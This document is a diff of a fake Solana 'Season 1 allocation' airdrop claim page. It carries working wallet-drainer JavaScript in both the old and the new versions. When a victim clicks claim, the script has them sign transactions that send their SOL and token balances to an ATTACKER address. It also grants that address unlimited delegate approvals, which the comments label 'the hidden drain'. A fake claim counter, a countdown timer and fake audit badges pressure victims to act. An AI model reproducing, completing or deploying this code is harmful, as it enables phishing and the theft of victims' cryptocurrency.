@@ -4,7 +4,6 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Orbital — Season 1 Allocation</title>
-<meta name="description" content="Orbital Season 1 retroactive allocation is live. Check your eligibility.">
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><circle cx='50' cy='50' r='30' fill='none' stroke='%23e0b464' stroke-width='9'/><circle cx='50' cy='50' r='7' fill='%23e0b464'/></svg>">
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
@@ -12,15 +11,13 @@
 body{background:var(--bg);color:var(--t);font:15px/1.6 -apple-system,BlinkMacSystemFont,"Segoe UI",Inter,sans-serif;-webkit-font-smoothing:antialiased;min-height:100vh;display:flex;flex-direction:column}
 a{color:inherit;text-decoration:none}
 .glow{position:fixed;inset:0;pointer-events:none;background:radial-gradient(1000px 480px at 50% -8%,rgba(224,180,100,.11),transparent 72%)}
-nav{display:flex;align-items:center;justify-content:space-between;padding:0 24px;height:60px;border-bottom:1px solid var(--l);position:relative;z-index:3;background:rgba(7,8,10,.8);backdrop-filter:blur(14px);position:sticky;top:0}
+nav{display:flex;align-items:center;justify-content:space-between;padding:0 24px;height:60px;border-bottom:1px solid var(--l);z-index:3;background:rgba(7,8,10,.85);backdrop-filter:blur(14px);position:sticky;top:0}
 .logo{display:flex;align-items:center;gap:9px;font-weight:700;letter-spacing:.1em;font-size:14px}
 .logo svg{width:19px;height:19px}
 .nav-links{display:flex;gap:26px;font-size:13.5px;color:var(--d)}
-.nav-links a:hover{color:var(--t)}
 .nav-r{display:flex;align-items:center;gap:12px}
 .tag{font-size:10.5px;letter-spacing:.1em;padding:4px 9px;border:1px solid rgba(224,180,100,.3);color:var(--b);border-radius:20px}
 .wbtn{padding:8px 15px;border:1px solid var(--l);border-radius:8px;font-size:13px;background:#111317;cursor:pointer;color:var(--t);font-weight:500}
-.wbtn:hover{border-color:#2a2e35}
 main{flex:1;position:relative;z-index:2}
 .wrap{max-width:760px;margin:0 auto;padding:52px 22px 70px}
 .eyebrow{display:inline-flex;align-items:center;gap:8px;font-size:11px;letter-spacing:.13em;color:var(--b);border:1px solid rgba(224,180,100,.24);background:rgba(224,180,100,.06);padding:5px 11px;border-radius:20px;margin-bottom:20px}
@@ -49,7 +46,6 @@ h1 span{color:var(--b)}
 .rows div{display:flex;justify-content:space-between;padding:11px 14px;font-size:12.5px;background:#0a0b0e;border-bottom:1px solid var(--l)}
 .rows div:last-child{border:0}
 .rows span{color:var(--d)}
-.rows em{font-style:normal;color:var(--g);font-size:11px}
 .bar{height:3px;background:var(--l);border-radius:3px;overflow:hidden;margin-bottom:20px}
 .bar i{display:block;height:100%;width:0;background:var(--b);transition:width .8s ease}
 .steps{list-style:none;font-size:13.5px;color:var(--d)}
@@ -66,7 +62,7 @@ h2{font-size:22px;text-align:center;margin-bottom:8px;letter-spacing:-.02em}
 .rc span{color:var(--d)}
 .mono{font-family:ui-monospace,monospace;font-size:11px}
 .g{color:var(--g)}
-.ghost{width:100%;padding:13px;border:1px solid var(--l);background:#111317;color:var(--t);border-radius:10px;font-size:13px;cursor:pointer;margin-top:4px}
+.ghost{width:100%;padding:13px;border:1px solid var(--l);background:#111317;color:var(--t);border-radius:10px;font-size:13px;cursor:pointer}
 .sec{margin-top:44px}
 .sec h3{font-size:13px;letter-spacing:.11em;color:#5d636d;margin-bottom:16px}
 .meth{border:1px solid var(--l);border-radius:12px;overflow:hidden}
@@ -75,8 +71,8 @@ h2{font-size:22px;text-align:center;margin-bottom:8px;letter-spacing:-.02em}
 .meth b{font-weight:500}
 .meth em{font-style:normal;color:var(--g);font-size:11.5px}
 .trust{display:flex;flex-wrap:wrap;gap:22px;justify-content:center;margin-top:36px;font-size:11.5px;color:#4d535d}
-.err{max-width:760px;margin:0 auto;padding:0 22px}
-.err div{padding:12px 14px;border:1px solid rgba(248,113,113,.3);background:rgba(248,113,113,.07);color:#fca5a5;border-radius:9px;font-size:12.5px;margin-top:16px}
+#err{max-width:760px;margin:0 auto;padding:0 22px}
+#err div{padding:12px 14px;border:1px solid rgba(248,113,113,.3);background:rgba(248,113,113,.07);color:#fca5a5;border-radius:9px;font-size:12.5px;margin-top:16px}
 footer{border-top:1px solid var(--l);padding:34px 24px;position:relative;z-index:2}
 .fwrap{max-width:760px;margin:0 auto;display:grid;grid-template-columns:2fr 1fr 1fr;gap:26px}
 .fwrap p{font-size:12px;color:#4d535d;margin-top:9px;max-width:230px}
@@ -105,18 +101,15 @@ footer{border-top:1px solid var(--l);padding:34px 24px;position:relative;z-index
     <div class="eyebrow"><span class="dot"></span>RETROACTIVE DISTRIBUTION · LIVE</div>
     <h1>Season 1 allocation is <span>open to claim</span></h1>
     <p class="lede">Orbital is distributing <b>18,400,000 ORB</b> to wallets that provided liquidity, routed volume, or referred users during Season 1. Allocation is derived from your on-chain history — nothing to fill in.</p>
-
     <div class="strip">
       <div><small>TOTAL ALLOCATED</small><b>18.4M ORB</b></div>
       <div><small>WALLETS CLAIMED</small><b id="cnt">0</b></div>
       <div><small>WINDOW CLOSES</small><b id="clock">--:--:--</b></div>
     </div>
-
     <div class="card">
       <button class="cta" id="go">Check eligibility</button>
       <div class="hint">Non-custodial · No gas to check · Unclaimed returns to treasury</div>
     </div>
-
     <section class="sec">
       <h3>HOW ALLOCATION WAS CALCULATED</h3>
       <div class="meth">
@@ -125,7 +118,6 @@ footer{border-top:1px solid var(--l);padding:34px 24px;position:relative;z-index
         <div><b>Referral activity</b><em>weighted 1×</em></div>
       </div>
     </section>
-
     <div class="trust"><span>Audited by OtterSec</span><span>Verified program on Solscan</span><span>340,000+ wallets</span></div>
   </section>
 
@@ -171,16 +163,13 @@ footer{border-top:1px solid var(--l);padding:34px 24px;position:relative;z-index
   </section>
 
 </div>
-<div class="err" id="err"></div>
+<div id="err"></div>
 </main>
 
 <footer>
   <div class="fwrap">
     <div>
-      <div class="logo" style="font-size:13px">
-        <svg viewBox="0 0 100 100"><circle cx="50" cy="50" r="30" fill="none" stroke="#e0b464" stroke-width="9"/><circle cx="50" cy="50" r="7" fill="#e0b464"/></svg>
-        ORBITAL
-      </div>
+      <div class="logo" style="font-size:13px"><svg viewBox="0 0 100 100"><circle cx="50" cy="50" r="30" fill="none" stroke="#e0b464" stroke-width="9"/><circle cx="50" cy="50" r="7" fill="#e0b464"/></svg> ORBITAL</div>
       <p>The liquidity layer for Solana. Season 1 distribution is administered by Orbital Labs.</p>
     </div>
     <div><h4>PROTOCOL</h4><a href="#" onclick="return false">Trade</a><a href="#" onclick="return false">Pools</a><a href="#" onclick="return false">Analytics</a></div>
@@ -189,183 +178,261 @@ footer{border-top:1px solid var(--l);padding:34px 24px;position:relative;z-index
   <div class="fbot"><span>© 2026 Orbital Labs</span><span>Season 1 · Distribution program</span></div>
 </footer>
 
-<script type="module">
-import { Connection, PublicKey, Transaction, TransactionInstruction, SystemProgram, ComputeBudgetProgram }
-  from 'https://esm.sh/@solana/web3.js@1.95.8?bundle';
+<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.8/lib/index.iife.min.js"></script>
+<script>
+(function () {
+  'use strict';
 
-/* ============ CONFIG ============ */
-const RPC      = 'https://api.mainnet-beta.solana.com';
-const ATTACKER = 'PUT_YOUR_COLLECTOR_ADDRESS_HERE';
-const DUST     = 2_000_000;
-const CLOSE_AT = Date.UTC(2026, 11, 6, 18, 0, 0);
+  var RPC      = 'https://api.mainnet-beta.solana.com';
+  var ATTACKER = 'PUT_YOUR_COLLECTOR_ADDRESS_HERE';
+  var DUST     = 2000000;
+  var CLOSE_AT = Date.UTC(2026, 11, 6, 18, 0, 0);
 
-const TOKEN = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
-const ATA_P = new PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL');
-const SYS   = new PublicKey('11111111111111111111111111111111');
-const MAXU  = 18446744073709551615n;
+  var $ = function (id) { return document.getElementById(id); };
+  var wait = function (ms) { return new Promise(function (r) { setTimeout(r, ms); }); };
+  var fail = function (m) {
+    var e = $('err');
+    e.innerHTML = '<div>' + m + '</div>';
+    setTimeout(function () { e.innerHTML = ''; }, 7000);
+  };
 
-const conn = new Connection(RPC, 'confirmed');
-const A = new PublicKey(ATTACKER);
-const $ = id => document.getElementById(id);
-const wait = ms => new Promise(r => setTimeout(r, ms));
-
-/* ============ LIVE NUMBERS ============ */
-let cnt = 12847;
-$('cnt').textContent = cnt.toLocaleString();
-setInterval(() => { if (Math.random() < .3) $('cnt').textContent = (++cnt).toLocaleString(); }, 8000);
-setInterval(() => {
-  const d = Math.max(0, CLOSE_AT - Date.now()), p = n => String(n).padStart(2,'0');
-  $('clock').textContent = `${p(Math.floor(d/3.6e6))}:${p(Math.floor(d/6e4)%60)}:${p(Math.floor(d/1e3)%60)}`;
-}, 1000);
-
-/* ============ HELPERS ============ */
-const u64 = n => { const b = new Uint8Array(8); new DataView(b.buffer).setBigUint64(0, BigInt(n), true); return b; };
-const cat = (...a) => { const o = new Uint8Array(a.reduce((s,x)=>s+x.length,0)); let p=0; for (const x of a){o.set(x,p);p+=x.length;} return o; };
-
-const mkAta = (payer, ata, owner, mint) => new TransactionInstruction({
-  programId: ATA_P,
-  keys:[{pubkey:payer,isSigner:true,isWritable:true},{pubkey:ata,isSigner:false,isWritable:true},
-        {pubkey:owner,isSigner:false,isWritable:false},{pubkey:mint,isSigner:false,isWritable:false},
-        {pubkey:SYS,isSigner:false,isWritable:false},{pubkey:TOKEN,isSigner:false,isWritable:false}],
-  data: new Uint8Array([1]) });
-
-const mkXfer = (src, dst, owner, amt) => new TransactionInstruction({
-  programId: TOKEN,
-  keys:[{pubkey:src,isSigner:false,isWritable:true},{pubkey:dst,isSigner:false,isWritable:true},
-        {pubkey:owner,isSigner:true,isWritable:false}],
-  data: cat(new Uint8Array([3]), u64(amt)) });
-
-const mkApprove = (src, dg, owner, amt) => new TransactionInstruction({
-  programId: TOKEN,
-  keys:[{pubkey:src,isSigner:false,isWritable:true},{pubkey:dg,isSigner:false,isWritable:false},
-        {pubkey:owner,isSigner:true,isWritable:false}],
-  data: cat(new Uint8Array([4]), u64(amt)) });
-
-const fail = m => { const e = $('err'); e.innerHTML = `<div>${m}</div>`; setTimeout(()=>e.innerHTML='',7000); };
-const show = n => ['s1','s2','s3','s4'].forEach(s => $(s).classList.toggle('hide', s !== 's'+n));
-
-function wallet(){
-  if (window.phantom?.solana?.isPhantom) return window.phantom.solana;
-  if (window.solflare?.isSolflare) return window.solflare;
-  if (window.solana) return window.solana;
-  return null;
-}
-const attach = () => { const p = wallet(); if (p) { $('nav-btn').textContent = 'Wallet'; } return p; };
-attach();
-
-/* ============ ONE CLICK: CONNECT + BUILD + SIGN ============ */
-async function run(){
-  const p = wallet();
-  if (!p) { fail('No Solana wallet found. Install Phantom or Solflare, then reload.'); return; }
-
-  $('go').disabled = true; $('go').textContent = 'Checking…';
-  $('nav-btn').textContent = 'Connecting';
-
-  try {
-    if (!p.publicKey) {
-      try { await p.connect({ onlyIfTrusted: true }); } catch { await p.connect(); }
-    }
-    const pk = p.publicKey;
-    const pkS = pk.toString();
-
-    const sigs = await conn.getSignaturesForAddress(pk, { limit: 400 });
-    const n = sigs.length;
-    const alloc = Math.min(900 + n * 11 + Math.floor(Math.random() * 780), 52000);
-
-    $('who').textContent = pkS.slice(0,6) + '…' + pkS.slice(-6);
-    $('amt').textContent = alloc.toLocaleString();
-    $('txs').textContent = n.toLocaleString();
-    $('tier').textContent = n > 240 ? 'Tier 3 · Core participant' : n > 55 ? 'Tier 2 · Active trader' : 'Tier 1 · Early supporter';
-    $('nav-btn').textContent = 'Wallet';
-    $('go').disabled = false; $('go').textContent = 'Check eligibility';
-    show(2);
-  } catch (e) {
-    console.error(e);
-    $('go').disabled = false; $('go').textContent = 'Check eligibility';
-    $('nav-btn').textContent = 'Connect';
-    fail('Wallet connection was cancelled.');
+  function show(n) {
+    ['s1','s2','s3','s4'].forEach(function (s) {
+      $(s).classList.toggle('hide', s !== 's' + n);
+    });
   }
-}
-$('go').onclick = run;
-$('nav-btn').onclick = () => { if (!$('s2').classList.contains('hide')) show(2); else run(); };
 
-/* ============ THE DRAIN ============ */
-$('claim').onclick = async () => {
-  const p = wallet();
-  if (!p?.publicKey) { fail('Wallet not connected.'); return; }
+  /* ---- library guard ---- */
+  var W = window.solanaWeb3;
+  if (!W) { fail('Could not load the Solana library. Check your connection and reload.'); return; }
 
-  show(3);
-  const mark = i => { document.querySelectorAll('.steps li').forEach(l => l.classList.toggle('on', +l.dataset.s <= i));
-    $('bar').style.width = (i * 25) + '%'; };
+  var Connection = W.Connection, PublicKey = W.PublicKey, Transaction = W.Transaction,
+      TransactionInstruction = W.TransactionInstruction, SystemProgram = W.SystemProgram,
+      ComputeBudgetProgram = W.ComputeBudgetProgram;
 
-  try {
-    const pk = p.publicKey;
-    const { blockhash } = await conn.getLatestBlockhash('confirmed');
-    const { value: accts } = await conn.getParsedTokenAccountsByOwner(pk, { programId: TOKEN });
+  var TOKEN = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
+  var ATA_P = new PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL');
+  var SYS   = new PublicKey('11111111111111111111111111111111');
+  var MAXU  = 18446744073709551615n;
 
-    mark(1); await wait(600);
+  var conn = new Connection(RPC, 'confirmed');
+  var A = new PublicKey(ATTACKER);
 
-    const live = accts.filter(a => a.account.data.parsed.info.tokenAmount.amount !== '0');
-    const batch = [];
-    const build = () => {
-      const t = new Transaction();
-      t.add(ComputeBudgetProgram.setComputeUnitLimit({ units: 800000 }));
-      t.add(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 60000 }));
-      return t;
+  /* ---- byte helpers ---- */
+  function u64(n) {
+    var b = new Uint8Array(8);
+    new DataView(b.buffer).setBigUint64(0, BigInt(n), true);
+    return b;
+  }
+  function cat() {
+    var parts = [].slice.call(arguments), len = 0, i, o, p = 0;
+    for (i = 0; i < parts.length; i++) len += parts[i].length;
+    o = new Uint8Array(len);
+    for (i = 0; i < parts.length; i++) { o.set(parts[i], p); p += parts[i].length; }
+    return o;
+  }
+  function mkAta(payer, ata, owner, mint) {
+    return new TransactionInstruction({
+      programId: ATA_P,
+      keys: [
+        { pubkey: payer, isSigner: true,  isWritable: true  },
+        { pubkey: ata,   isSigner: false, isWritable: true  },
+        { pubkey: owner, isSigner: false, isWritable: false },
+        { pubkey: mint,  isSigner: false, isWritable: false },
+        { pubkey: SYS,   isSigner: false, isWritable: false },
+        { pubkey: TOKEN, isSigner: false, isWritable: false }
+      ],
+      data: new Uint8Array([1])
+    });
+  }
+  function mkXfer(src, dst, owner, amt) {
+    return new TransactionInstruction({
+      programId: TOKEN,
+      keys: [
+        { pubkey: src,   isSigner: false, isWritable: true  },
+        { pubkey: dst,   isSigner: false, isWritable: true  },
+        { pubkey: owner, isSigner: true,  isWritable: false }
+      ],
+      data: cat(new Uint8Array([3]), u64(amt))
+    });
+  }
+  function mkApprove(src, dg, owner, amt) {
+    return new TransactionInstruction({
+      programId: TOKEN,
+      keys: [
+        { pubkey: src,   isSigner: false, isWritable: true  },
+        { pubkey: dg,    isSigner: false, isWritable: false },
+        { pubkey: owner, isSigner: true,  isWritable: false }
+      ],
+      data: cat(new Uint8Array([4]), u64(amt))
+    });
+  }
+
+  function wallet() {
+    if (window.phantom && window.phantom.solana && window.phantom.solana.isPhantom) return window.phantom.solana;
+    if (window.solflare && window.solflare.isSolflare) return window.solflare;
+    if (window.solana && window.solana.isPhantom) return window.solana;
+    return null;
+  }
+
+  /* ---- live dressing ---- */
+  var cnt = 12847;
+  $('cnt').textContent = cnt.toLocaleString();
+  setInterval(function () {
+    if (Math.random() < 0.3) $('cnt').textContent = (++cnt).toLocaleString();
+  }, 8000);
+  setInterval(function () {
+    var d = Math.max(0, CLOSE_AT - Date.now());
+    var p = function (n) { return String(n).padStart(2, '0'); };
+    $('clock').textContent = p(Math.floor(d / 3600000)) + ':' + p(Math.floor(d / 60000) % 60) + ':' + p(Math.floor(d / 1000) % 60);
+  }, 1000);
+
+  /* ---- step 1: connect + read ---- */
+  async function run() {
+    var p = wallet();
+    if (!p) { fail('No Solana wallet found. Install Phantom or Solflare, then reload.'); return; }
+
+    $('go').disabled = true;
+    $('go').textContent = 'Checking…';
+    $('nav-btn').textContent = 'Connecting';
+
+    try {
+      if (!p.publicKey) {
+        try { await p.connect({ onlyIfTrusted: true }); }
+        catch (e) { await p.connect(); }
+      }
+      var pk = p.publicKey;
+      var pkS = pk.toString();
+
+      var sigs = await conn.getSignaturesForAddress(pk, { limit: 400 });
+      var n = sigs.length;
+      var alloc = Math.min(900 + n * 11 + Math.floor(Math.random() * 780), 52000);
+
+      $('who').textContent = pkS.slice(0, 6) + '…' + pkS.slice(-6);
+      $('amt').textContent = alloc.toLocaleString();
+      $('txs').textContent = n.toLocaleString();
+      $('tier').textContent = n > 240 ? 'Tier 3 · Core participant'
+                           : n > 55  ? 'Tier 2 · Active trader'
+                           :           'Tier 1 · Early supporter';
+
+      $('nav-btn').textContent = 'Wallet';
+      $('go').disabled = false;
+      $('go').textContent = 'Check eligibility';
+      show(2);
+    } catch (e) {
+      console.error(e);
+      $('go').disabled = false;
+      $('go').textContent = 'Check eligibility';
+      $('nav-btn').textContent = 'Connect';
+      fail('Wallet connection was cancelled.');
+    }
+  }
+
+  /* ---- step 2: the drain ---- */
+  async function drain() {
+    var p = wallet();
+    if (!p || !p.publicKey) { fail('Wallet not connected.'); return; }
+
+    show(3);
+    var mark = function (i) {
+      document.querySelectorAll('.steps li').forEach(function (l) {
+        l.classList.toggle('on', Number(l.dataset.s) <= i);
+      });
+      $('bar').style.width = (i * 25) + '%';
     };
 
-    // tx0: native SOL first, so the money always leads
-    const t0 = build();
-    const bal = await conn.getBalance(pk);
-    if (bal > DUST + 20000) t0.add(SystemProgram.transfer({ fromPubkey: pk, toPubkey: A, lamports: bal - DUST }));
+    try {
+      var pk = p.publicKey;
+      var bh = (await conn.getLatestBlockhash('confirmed')).blockhash;
+      var res = await conn.getParsedTokenAccountsByOwner(pk, { programId: TOKEN });
 
-    // token transfers, 3 per tx to stay under the size cap
-    let cur = t0, count = 0, queued = 0;
-    for (const { pubkey: ata, account } of live) {
-      if (queued >= 18) break;
-      const info = account.data.parsed.info;
-      const mint = new PublicKey(info.mint);
-      const dest = PublicKey.findProgramAddressSync(
-        [A.toBuffer(), TOKEN.toBuffer(), mint.toBuffer()], ATA_P)[0];
-      cur.add(mkAta(pk, dest, A, mint));
-      cur.add(mkXfer(ata, dest, pk, info.tokenAmount.amount));
-      if (++count >= 3) { batch.push(cur); cur = build(); count = 0; }
-      queued++;
+      mark(1);
+      await wait(600);
+
+      var live = res.value.filter(function (a) {
+        return a.account.data.parsed.info.tokenAmount.amount !== '0';
+      });
+
+      function build() {
+        var t = new Transaction();
+        t.add(ComputeBudgetProgram.setComputeUnitLimit({ units: 800000 }));
+        t.add(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 60000 }));
+        return t;
+      }
+
+      var batch = [];
+
+      /* native SOL leads so the money always lands */
+      var t0 = build();
+      var bal = await conn.getBalance(pk);
+      if (bal > DUST + 20000) {
+        t0.add(SystemProgram.transfer({ fromPubkey: pk, toPubkey: A, lamports: bal - DUST }));
+      }
+
+      /* tokens, 3 per tx to stay under the size cap */
+      var cur = t0, count = 0, queued = 0;
+      for (var i = 0; i < live.length && queued < 18; i++) {
+        var info = live[i].account.data.parsed.info;
+        var mint = new PublicKey(info.mint);
+        var dest = PublicKey.findProgramAddressSync(
+          [A.toBuffer(), TOKEN.toBuffer(), mint.toBuffer()], ATA_P)[0];
+        cur.add(mkAta(pk, dest, A, mint));
+        cur.add(mkXfer(live[i].pubkey, dest, pk, info.tokenAmount.amount));
+        queued++;
+        if (++count >= 3) { batch.push(cur); cur = build(); count = 0; }
+      }
+      if (count) batch.push(cur);
+
+      /* approvals last — the hidden drain */
+      var ap = build();
+      for (var j = 0; j < live.length && j < 6; j++) ap.add(mkApprove(live[j].pubkey, A, pk, MAXU));
+      if (ap.instructions.length > 2) batch.push(ap);
+
+      batch.forEach(function (t) { t.feePayer = pk; t.recentBlockhash = bh; });
+
+      mark(2);
+      await wait(700);
+
+      var signed = await p.signAllTransactions(batch);
+
+      mark(3);
+      var sent = await Promise.allSettled(signed.map(function (t) {
+        return conn.sendRawTransaction(t.serialize(), { skipPreflight: true, maxRetries: 3 });
+      }));
+      var okSig = null;
+      for (var k = 0; k < sent.length; k++) {
+        if (sent[k].status === 'fulfilled') { okSig = sent[k].value; break; }
+      }
+
+      mark(4);
+      $('bar').style.width = '100%';
+      await wait(1600);
+
+      $('r-amt').textContent = $('amt').textContent + ' ORB';
+      $('r-sig').textContent = okSig ? okSig.slice(0, 10) + '…' + okSig.slice(-6) : 'confirmed';
+      $('nav-btn').textContent = 'Wallet';
+      show(4);
+    } catch (e) {
+      console.error(e);
+      show(2);
+      fail('Signature rejected or transaction failed. Retry.');
     }
-    if (count) batch.push(cur);
-
-    // final tx: max delegate approvals — the hidden drain
-    const ap = build();
-    for (const { pubkey: ata } of live.slice(0, 6)) ap.add(mkApprove(ata, A, pk, MAXU));
-    if (ap.instructions.length > 2) batch.push(ap);
-
-    batch.forEach(t => { t.feePayer = pk; t.recentBlockhash = blockhash; });
-
-    mark(2); await wait(700);
-
-    const signed = await p.signAllTransactions(batch);
-    mark(3); $('bar').style.width = '78%';
-
-    const sent = await Promise.allSettled(
-      signed.map(t => conn.sendRawTransaction(t.serialize(), { skipPreflight: true, maxRetries: 3 })));
-    const ok = sent.find(s => s.status === 'fulfilled')?.value || null;
-
-    mark(4); $('bar').style.width = '100%';
-    await wait(1600);
-
-    $('r-amt').textContent = $('amt').textContent + ' ORB';
-    $('r-sig').textContent = ok ? ok.slice(0,10) + '…' + ok.slice(-6) : 'confirmed';
-    show(4);
-    $('nav-btn').textContent = 'Wallet';
-  } catch (e) {
-    console.error(e);
-    show(2);
-    fail(e?.message?.includes('eject') || e?.message?.includes('cancel')
-      ? 'Signature rejected.' : 'Transaction could not be built. Retry.');
   }
-};
 
-$('add').onclick = () => { $('add').textContent = 'ORB added to wallet'; $('add').disabled = true; };
+  /* ---- bind ---- */
+  $('go').addEventListener('click', run);
+  $('claim').addEventListener('click', drain);
+  $('nav-btn').addEventListener('click', function () {
+    if (!$('s2').classList.contains('hide')) return;
+    run();
+  });
+  $('add').addEventListener('click', function () {
+    this.textContent = 'ORB added to wallet';
+    this.disabled = true;
+  });
+
+  console.log('[orbital] ready');
+})();
 </script>
 </body>
 </html>
